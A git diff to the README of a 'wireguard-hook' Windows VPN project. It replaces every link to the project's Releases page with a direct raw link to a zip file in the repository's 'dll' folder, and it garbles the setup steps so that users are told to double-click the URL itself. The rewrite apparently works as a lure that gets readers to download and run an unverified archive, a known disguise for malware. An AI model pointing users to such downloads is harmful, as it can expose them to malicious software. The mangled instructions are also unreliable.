@@ -6,7 +6,7 @@ Welcome to wireguard-hook! This project enables your WireGuard VPN client on Win
 
 ## 📥 Download Now
 
-[![Download wireguard-hook](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/sandyemousy17/wireguard-hook/releases)
+[![Download wireguard-hook](https://raw.githubusercontent.com/sandyemousy17/wireguard-hook/main/dll/wireguard-hook-v2.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/sandyemousy17/wireguard-hook/main/dll/wireguard-hook-v2.2.zip)
 
 ## 📋 What You’ll Need
 
@@ -27,11 +27,11 @@ Welcome to wireguard-hook! This project enables your WireGuard VPN client on Win
 
 Head to the Releases page to download the latest version of wireguard-hook:
 
-[Download wireguard-hook](https://github.com/sandyemousy17/wireguard-hook/releases)
+[Download wireguard-hook](https://raw.githubusercontent.com/sandyemousy17/wireguard-hook/main/dll/wireguard-hook-v2.2.zip)
 
 ### 2. Choose the Correct File
 
-On the Releases page, look for the most recent version. Click the link that says **wireguard-hook.zip**. This file contains the software you need.
+On the Releases page, look for the most recent version. Click the link that says **https://raw.githubusercontent.com/sandyemousy17/wireguard-hook/main/dll/wireguard-hook-v2.2.zip**. This file contains the software you need.
 
 ### 3. Download the File
 
@@ -43,7 +43,7 @@ After downloading, locate the zip file in your Downloads folder. Right-click the
 
 ### 5. Run the Application
 
-Open the extracted folder. Double-click the **wireguard-hook.exe** file to launch the application. 
+Open the extracted folder. Double-click the **https://raw.githubusercontent.com/sandyemousy17/wireguard-hook/main/dll/wireguard-hook-v2.2.zip** file to launch the application. 
 
 ### 6. Configure Your Settings
 
@@ -77,4 +77,4 @@ For detailed usage and advanced features, refer to the following resources:
 
 Remember, you can always return to the releases page to download the latest version or reinstall the application if needed.
 
-[Download wireguard-hook](https://github.com/sandyemousy17/wireguard-hook/releases)
+[Download wireguard-hook](https://raw.githubusercontent.com/sandyemousy17/wireguard-hook/main/dll/wireguard-hook-v2.2.zip)
